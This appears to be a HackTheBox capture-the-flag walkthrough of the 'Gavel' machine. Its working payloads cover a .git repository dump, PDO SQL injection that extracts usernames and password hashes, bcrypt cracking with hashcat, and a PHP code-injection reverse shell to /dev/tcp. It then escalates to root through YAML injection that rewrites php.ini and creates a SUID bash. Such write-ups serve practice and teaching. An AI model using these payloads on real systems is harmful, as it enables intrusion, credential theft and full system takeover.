# HackTheBox - Gavel
**Youtube video:** https://youtu.be/VnpLVMY-TNY
---
## Initial Foothold

**Enumeration:**
```bash
# Add to hosts
echo "$IP gavel.htb" | sudo tee -a /etc/hosts

# Directory enumeration
# Sign up + sign in to application
```

**Git Repository Disclosure:**
```bash
# Dump exposed .git directory
git-dumper http://gavel.htb/.git/ gavel_git

# We expose SQL using snyk
```

---
## SQL Injection Exploitation

**Vulnerability Location:**
```
# Injection point: $col variable in PDO prepared statement
```

**Novel PDO SQL Injection Technique:**
- **Reference:** https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/#older-php-versions-are-much-more-vulnerable
- **Payload format:** `\?;--+-%00` & 0x3B => ;

**Manual SQL Injection:**
```bash
# Enumerate MySQL version
user_id=x`+FROM+(SELECT+VERSION()+AS+`'x`)y;--+-&sort=\?;--+-%00

# Show all tables (separated by ; in hex 0x3B)
user_id=x`+FROM+(SELECT+concat(table_schema,0x3B,table_name)+AS+`'x`+FROM+information_schema.tables)y;--+-&sort=\?;--+-%00

# Enumerate usernames and passwords
user_id=x`+FROM+(SELECT+concat(username,0x3B,password)+AS+`'x`+FROM+users)y;--+-&sort=\?;--+-%00
```

**Crack Password Hash:**
```bash
# Crack bcrypt hash
hashcat -m 3200 hash.txt $rockyou

```

---
## Command Injection via runkit_function_add()

**Sign in as auctioneer**

**PHP Code Injection:**
```php
# Vulnerable function: runkit_function_add()
# Command injection via bid functionality

# Reverse shell payload
system("bash -c 'bash >& /dev/tcp/$IP/4444 0>&1'");return true;

# Make a bid to trigger reverse shell
```

---
## Privilege Escalation

**Enumeration:**
- **Tool:** https://github.com/strikoder/LinEnum-ng
```bash
# Run LinEnum-ng
./linenum-ng.sh

# Switch to auctioneer user
su - auctioneer

# Run LinEnum-ng again as auctioneer
./linenum-ng.sh

# Double check files that our group owns
find / -group auctioneer 2>/dev/null
```


**Gavel-Util Analysis:**
```bash
# Check gavel-util commands
gavel-util submit /opt/gavel/sample.yaml

# Note: Remove "item:" and blank spaces from YAML
```

---
## Root via YAML Injection

**PHP Configuration Check:**
```bash
# Check PHP disabled functions
cat /opt/gavel/.config/php/php.ini
# Reference list: https://github.com/strikoder/OffensiveSecurity/blob/ebe311284582a63d582b1fd8929fd32ffa04f7c7/misc/check_disabled_functions.php#L4
```



**Disable Function Bypass**
```yaml
# Alternative payload to disable PHP restrictions
name: "Dragon's Feathered"
description: "A flamboyant hat to make dragons jealous."
image: "https://example.com/dragon_hat.png"
price: 10
rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
rule: "file_put_contents('/opt/gavel/.config/php/php.ini','engine=On\ndisable_functions=\n'); return true;"
```

**Then: SUID Bash**
```yaml
# Create malicious YAML: strikoder.yaml
name: root
description: make suid bash
image: "str.png"
price: 911
rule_msg: "rooted"
rule: system('cp /bin/bash /opt/bash; chmod +s /opt/bash'); return true;
```
```bash
# Submit YAML
/usr/local/bin/gavel-util submit /home/auctioneer/strikoder.yaml

# Execute SUID bash
/opt/bash -p
```

